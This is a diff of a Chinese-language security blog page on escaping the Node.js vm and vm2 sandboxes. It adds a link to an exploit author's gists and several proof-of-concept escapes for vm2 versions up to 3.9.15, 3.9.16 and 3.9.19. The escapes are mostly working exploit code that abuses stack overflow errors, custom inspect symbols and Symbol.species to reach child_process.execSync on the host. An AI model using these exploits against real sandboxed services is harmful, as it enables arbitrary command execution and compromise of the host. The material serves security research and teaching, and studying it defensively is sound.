@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121201038924.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121200900952.png">
 <meta property="article:published_time" content="2023-11-20T12:56:48.000Z">
-<meta property="article:modified_time" content="2024-01-15T13:23:58.220Z">
+<meta property="article:modified_time" content="2024-02-04T14:28:51.278Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231120214548117.png">
@@ -238,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          16k 字
+          18k 字
         
       </span>
     
@@ -249,7 +249,7 @@
         
         
         
-          136 分钟
+          148 分钟
         
       </span>
     
@@ -620,7 +620,8 @@ obj.<span class="hljs-title function_">__defineGetter__</span>(<span class="hljs
 <p><img src="/../images/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/image-20231121191439463.png" srcset="/img/loading.gif" lazyload alt="image-20231121191439463"></p>
 <p>相比于vm的沙箱环境，vm2最重要的一步就是引入<code>sandbox.js</code>并针对context做封装</p>
 <p>vm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了</p>
-<h2 id="vm2沙箱绕过"><a href="#vm2沙箱绕过" class="headerlink" title="vm2沙箱绕过"></a>vm2沙箱绕过</h2><h3 id="CVE-2019-10761"><a href="#CVE-2019-10761" class="headerlink" title="CVE-2019-10761"></a>CVE-2019-10761</h3><p>vm2版本&lt;&#x3D;3.6.10</p>
+<h2 id="vm2沙箱绕过"><a href="#vm2沙箱绕过" class="headerlink" title="vm2沙箱绕过"></a>vm2沙箱绕过</h2><p><a target="_blank" rel="noopener" href="https://gist.github.com/leesh3288">leesh3288’s gists (github.com)</a></p>
+<h3 id="CVE-2019-10761"><a href="#CVE-2019-10761" class="headerlink" title="CVE-2019-10761"></a>CVE-2019-10761</h3><p>vm2版本&lt;&#x3D;3.6.10</p>
 <div class="code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-string">&quot;use strict&quot;</span>;
 const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm2&#x27;</span>);
 const untrusted = `<span class="language-javascript"></span>
@@ -677,6 +678,24 @@ this<span class="hljs-selector-class">.utf8Write</span>()   <span class="hljs-co
 res.<span class="hljs-property">toString</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return this&quot;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>();</code></pre></div>
 
 <p>import()在JavaScript中是一个语法结构，不是函数，没法通过之前对<code>require</code>这种函数处理相同的方法来处理它，导致实际上我们调用import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正则匹配并替换了<code>\bimport\b</code>关键字，在编译失败的时候，报Dynamic Import not supported错误。</p>
+<h3 id="VM2"><a href="#VM2" class="headerlink" title="VM2 &lt;&#x3D;3.9.15 POC"></a>VM2 &lt;&#x3D;3.9.15 POC</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">const</span> &#123;VM&#125; = <span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">vm</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">VM</span>();
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">code</span> = `
+aVM2_INTERNAL_TMPNAME = &#123;&#125;;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stack</span>(<span class="hljs-params"></span>) </span>&#123;
+    <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>().stack;
+    <span class="hljs-title function_ invoke__">stack</span>();
+&#125;
+<span class="hljs-keyword">try</span> &#123;
+    <span class="hljs-title function_ invoke__">stack</span>();
+&#125; <span class="hljs-keyword">catch</span> (a<span class="hljs-variable">$tmpname</span>) &#123;
+    a<span class="hljs-variable">$tmpname</span>.constructor.<span class="hljs-title function_ invoke__">constructor</span>(<span class="hljs-string">&#x27;return process&#x27;</span>)().mainModule.<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_ invoke__">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>);
+&#125;
+`
+
+console.<span class="hljs-title function_ invoke__">log</span>(vm.<span class="hljs-title function_ invoke__">run</span>(code));</code></pre></div>
+
 <h3 id="vm2-1"><a href="#vm2-1" class="headerlink" title="vm2&lt;&#x3D;3.9.16逃逸"></a>vm2&lt;&#x3D;3.9.16逃逸</h3><div class="code-wrapper"><pre><code class="hljs coffeescript">const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);
 const vm = <span class="hljs-keyword">new</span> VM();
 
@@ -698,6 +717,51 @@ const code = `<span class="language-javascript"></span>
 <span class="language-javascript">    c.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>);</span>
 <span class="language-javascript">&#125;</span>
 <span class="language-javascript"></span>`
+
+console.log(vm.run(code));</code></pre></div>
+
+<h3 id="vm2-2"><a href="#vm2-2" class="headerlink" title="vm2&lt;&#x3D;3.9.19 POC"></a>vm2&lt;&#x3D;3.9.19 POC</h3><div class="code-wrapper"><pre><code class="hljs coffeescript">const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);
+const vm = <span class="hljs-keyword">new</span> VM();
+
+const code = `<span class="language-javascript"></span>
+<span class="language-javascript"><span class="hljs-keyword">const</span> customInspectSymbol = <span class="hljs-title class_">Symbol</span>.<span class="hljs-title function_">for</span>(<span class="hljs-string">&#x27;nodejs.util.inspect.custom&#x27;</span>);</span>
+<span class="language-javascript"></span>
+<span class="language-javascript">obj = &#123;</span>
+<span class="language-javascript">    [customInspectSymbol]: <span class="hljs-function">(<span class="hljs-params">depth, opt, inspect</span>) =&gt;</span> &#123;</span>
+<span class="language-javascript">        inspect.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>);</span>
+<span class="language-javascript">    &#125;,</span>
+<span class="language-javascript">    <span class="hljs-attr">valueOf</span>: <span class="hljs-literal">undefined</span>,</span>
+<span class="language-javascript">    <span class="hljs-attr">constructor</span>: <span class="hljs-literal">undefined</span>,</span>
+<span class="language-javascript">&#125;</span>
+<span class="language-javascript"></span>
+<span class="language-javascript"><span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title function_">compileStreaming</span>(obj).<span class="hljs-title function_">catch</span>(<span class="hljs-function">()=&gt;</span>&#123;&#125;);</span>
+<span class="language-javascript"></span>`;
+
+vm.run(code);</code></pre></div>
+
+<h3 id="vm2-3"><a href="#vm2-3" class="headerlink" title="vm2&lt;&#x3D;3.9.19 POC"></a>vm2&lt;&#x3D;3.9.19 POC</h3><div class="code-wrapper"><pre><code class="hljs coffeescript">const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);
+const vm = <span class="hljs-keyword">new</span> VM();
+
+const code = `<span class="language-javascript"></span>
+<span class="language-javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>) &#123;</span>
+<span class="language-javascript">    (<span class="hljs-keyword">function</span> <span class="hljs-title function_">stack</span>(<span class="hljs-params"></span>) &#123;</span>
+<span class="language-javascript">        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>().<span class="hljs-property">stack</span>;</span>
+<span class="language-javascript">        <span class="hljs-title function_">stack</span>();</span>
+<span class="language-javascript">    &#125;)();</span>
+<span class="language-javascript">&#125;</span>
+<span class="language-javascript">p = <span class="hljs-title function_">fn</span>();</span>
+<span class="language-javascript">p.<span class="hljs-property">constructor</span> = &#123;</span>
+<span class="language-javascript">    [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">species</span>]: <span class="hljs-keyword">class</span> <span class="hljs-title class_">FakePromise</span> &#123;</span>
+<span class="language-javascript">        <span class="hljs-title function_">constructor</span>(<span class="hljs-params">executor</span>) &#123;</span>
+<span class="language-javascript">            <span class="hljs-title function_">executor</span>(</span>
+<span class="language-javascript">                <span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> x,</span>
+<span class="language-javascript">                <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123; <span class="hljs-keyword">return</span> err.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>); &#125;</span>
+<span class="language-javascript">            )</span>
+<span class="language-javascript">        &#125;</span>
+<span class="language-javascript">    &#125;</span>
+<span class="language-javascript">&#125;;</span>
+<span class="language-javascript">p.<span class="hljs-title function_">then</span>();</span>
+<span class="language-javascript"></span>`;
 
 console.log(vm.run(code));</code></pre></div>
 
